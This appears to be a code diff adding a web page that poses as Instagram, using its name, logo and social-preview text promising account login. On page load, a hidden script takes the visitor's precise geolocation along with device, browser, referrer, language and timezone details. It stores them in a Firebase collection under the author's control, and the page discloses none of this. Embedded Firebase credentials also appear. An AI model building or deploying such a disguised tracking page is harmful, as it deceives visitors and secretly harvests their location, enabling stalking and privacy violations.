@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+
+    <!-- Open Graph meta tags -->
+    <meta
+      property="og:title"
+      content="Create an account or Login to Instagram "
+    />
+    <meta
+      property="og:description"
+      content="Share your live location with Instagram style."
+    />
+    <meta
+      property="og:image"
+      content="https://cdn-icons-png.flaticon.com/512/174/174855.png"
+    />
+    <meta property="og:url" content="https://yourwebsite.com" />
+    <meta property="og:type" content="website" />
+
+    <!-- Twitter Card meta tags -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta
+      name="twitter:title"
+      content="Create an account or Login to Instagram "
+    />
+    <meta
+      name="twitter:description"
+      content="Share your live location with Instagram style."
+    />
+    <meta
+      name="twitter:image"
+      content="https://cdn-icons-png.flaticon.com/512/174/174855.png"
+    />
+    <meta name="twitter:url" content="https://yourwebsite.com" />
+
+    <script type="module">
+      // Import Firebase services
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+      import {
+        getFirestore,
+        addDoc,
+        collection,
+      } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+
+      // Initialize Firebase
+      const firebaseConfig = {
+        apiKey: "AIzaSyD57QYhIVbgk7gzKGDM6TbsVWyZNXnncoA",
+        authDomain: "todolist-59971.firebaseapp.com",
+        databaseURL: "https://todolist-59971.firebaseio.com",
+        projectId: "todolist-59971",
+        storageBucket: "todolist-59971.appspot.com",
+        messagingSenderId: "317389610882",
+        appId: "1:317389610882:web:67d6e7844fe5cc1c93799b",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      // Get user location
+      function getUserLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(saveLocationToFirebase);
+        } else {
+          alert("Geolocation is not supported by this browser.");
+        }
+      }
+
+      // Save location to Firestore
+      async function saveLocationToFirebase(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const deviceType = /Mobi/.test(navigator.userAgent)
+          ? "Mobile"
+          : "Desktop";
+        const userAgent = navigator.userAgent;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const referrer = document.referrer;
+        const userLanguage = navigator.language || navigator.userLanguage;
+        const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        try {
+          await addDoc(collection(db, "userLocations"), {
+            latitude: latitude,
+            longitude: longitude,
+            timestamp: new Date(),
+            userId: "anonymous",
+            deviceType: deviceType,
+            userAgent: userAgent,
+            screenWidth: screenWidth,
+            screenHeight: screenHeight,
+            referrer: referrer,
+            userLanguage: userLanguage,
+            userTimezone: userTimezone
+          });
+          console.log("Location saved to Firebase");
+        } catch (error) {
+          console.error("Error adding location: ", error);
+        }
+      }
+
+      // Call the function to get user location when the page loads
+      window.onload = getUserLocation;
+    </script>
+    <!-- Basic CSS to make it look like Instagram -->
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          "Helvetica Neue", Arial, sans-serif;
+        background-color: #fafafa;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        background-color: #fff;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        width: 400px;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+      }
+
+      .header {
+        padding: 10px 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #dbdbdb;
+      }
+
+      .header h1 {
+        font-size: 16px;
+        font-weight: bold;
+      }
+
+      .header img {
+        width: 24px;
+        height: 24px;
+      }
+
+      #map {
+        height: 300px;
+        width: 100%;
+        border-bottom: 1px solid #dbdbdb;
+      }
+
+      .location-info {
+        padding: 16px;
+        text-align: center;
+      }
+
+      .location-info p {
+        margin: 0;
+        font-size: 14px;
+        color: #8e8e8e;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>Live Location</h1>
+        <img
+          src="https://cdn-icons-png.flaticon.com/512/174/174855.png"
+          alt="Instagram Logo"
+        />
+      </div>
+
+      <div id="map"></div>
+
+      <div class="location-info">
+        <p id="coords">Fetching location...</p>
+      </div>
+    </div>
+  </body>
+</html>
